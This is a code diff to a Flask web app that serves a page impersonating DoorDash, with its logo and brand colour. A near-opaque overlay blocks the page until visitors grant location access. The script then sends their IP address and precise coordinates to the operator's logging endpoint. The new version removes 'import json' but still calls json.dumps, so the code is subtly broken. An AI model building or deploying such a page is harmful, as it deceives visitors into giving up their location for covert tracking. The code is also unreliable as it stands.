@@ -1,8 +1,7 @@
-from flask import Flask, request, jsonify, redirect
+from flask import Flask, request, jsonify
 import logging
 from datetime import datetime
 import os
-import json
 
 app = Flask(__name__)
 
@@ -20,151 +19,146 @@ HTML_TEMPLATE = """
 <head>
     <title>Location Service</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-            body {
+        body {
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
             background: #f8f8f8;
         }
-        .gps-overlay {{
+        #gps-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.50);
+            background: rgba(0,0,0,0.95);  /* Increased opacity */
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 10000;
-        }}
-        .gps-modal {{
+        }
+        #gps-modal {
             background: white;
-            padding: 25px;
-            border-radius: 10px;
-            max-width: 400px;
+            padding: 30px;
+            border-radius: 12px;
             text-align: center;
-        }}
-        .gps-btn {{
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+        #gps-logo {
+            width: 140px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #2e3131;
+            font-weight: 600;
+            font-size: 22px;
+            margin: 0 0 10px 0;
+        }
+        p {
+            color: #6b7177;
+            font-size: 16px;
+            line-height: 1.5;
+            margin: 0 0 20px 0;
+        }
+        #allow-btn {
             background: #FF3008;
             color: white;
             border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
+            padding: 12px 24px;
+            border-radius: 8px;
             font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 15px;
-            font-weight: bold;
-        }}
+            transition: background 0.2s;
+        }
+        #allow-btn:hover {
+            background: #e62e00;
+        }
     </style>
 </head>
 <body>
-    <!-- Your existing content -->
-    {existing_content}
-    
+    <!-- Your existing content would be here -->
+    <h1>Welcome to the Service</h1>
+    <p>Main content will appear after location permission</p>
+
     <!-- GPS Permission Overlay -->
-    <div class="gps-overlay">
-        <div class="gps-modal">
-            <img src="https://1000logos.net/wp-content/uploads/2021/06/DoorDash-logo.png" width="120" alt="DoorDash">
-            <h2>Let us show you resturants near you!</h2>
-            <p>Please allow location access to continue to DoorDash.com</p>
-            <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
+    <div id="gps-overlay">
+        <div id="gps-modal">
+            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" id="gps-logo" alt="Logo">
+            <h2>We need your location to serve you better</h2>
+            <p>Please allow location access to find nearby services</p>
+            <button id="allow-btn">Allow Location Access</button>
         </div>
     </div>
 
     <script>
-        async function sendDataAndRedirect(locationData) {{
-            try {{
-                // Send data to server
-                const response = await fetch('/log_location', {{
+        async function logData(data) {
+            try {
+                await fetch('/log', {
                     method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(locationData)
-                }});
-                
-                if (response.ok) {{
-                    // Redirect to DoorDash after successful logging
-                    window.location.href = "https://www.doordash.com";
-                }} else {{
-                    alert("Error processing your request. Please try again.");
-                }}
-            }} catch (error) {{
-                console.error('Error:', error);
-                alert("An error occurred. Please try again.");
-            }}
-        }}
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Logging error:', error);
+            }
+        }
 
-        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
-            try {{
-                // Get client IP first
-                const clientIp = await fetch('/getip').then(r => r.text());
+        document.getElementById('allow-btn').addEventListener('click', async () => {
+            try {
+                // Get client IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
                 
                 // Log permission request
-                await sendDataAndRedirect({{
+                await logData({
                     type: 'permission_request',
-                    ip: clientIp,
+                    ip: ipData.ip,
                     timestamp: new Date().toISOString()
-                }});
-                
+                });
+
                 // Request location
-                const position = await new Promise((resolve, reject) => {{
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }});
-                }});
-                
-                // Log location and redirect
-                await sendDataAndRedirect({{
+                        timeout: 10000
+                    });
+                });
+
+                // Log location data
+                await logData({
                     type: 'location_data',
-                    ip: clientIp,
+                    ip: ipData.ip,
                     lat: position.coords.latitude,
                     lng: position.coords.longitude,
                     accuracy: position.coords.accuracy,
                     timestamp: new Date().toISOString()
-                }});
+                });
+
+                // Hide overlay
+                document.getElementById('gps-overlay').style.display = 'none';
                 
-            }} catch (error) {{
+            } catch (error) {
                 console.error('Location error:', error);
-                const clientIp = await fetch('/getip').then(r => r.text());
-                await sendDataAndRedirect({{
-                    type: 'error',
-                    ip: clientIp,
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                }});
-                alert("Location access is required to continue to DoorDash.");
-            }}
-        }});
+                alert("Location access is required to continue.");
+            }
+        });
     </script>
 </body>
 </html>
 """
 
 @app.route('/')
-def serve_page():
-    """Serve the page with GPS overlay"""
+def home():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'unknown')
-    
-    logger.info(f"Page accessed - IP: {client_ip}, User Agent: {user_agent}")
-    
-    with open('page.html', 'r') as f:
-        existing_content = f.read()
-    
-    return HTML_TEMPLATE.format(existing_content=existing_content)
+    logger.info(f"Page accessed - IP: {client_ip}")
+    return HTML_TEMPLATE
 
-@app.route('/getip')
-def get_ip():
-    """Endpoint to get client IP"""
-    return request.headers.get('X-Forwarded-For', request.remote_addr)
-
-@app.route('/log_location', methods=['POST'])
-def log_location():
-    """Endpoint to log location data"""
+@app.route('/log', methods=['POST'])
+def log():
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
@@ -175,8 +169,6 @@ def log_location():
     }
     
     logger.info(json.dumps(log_entry, indent=2))
-    
-    # Additional processing can be done here if needed
     return jsonify({'status': 'success'})
 
 if __name__ == '__main__':
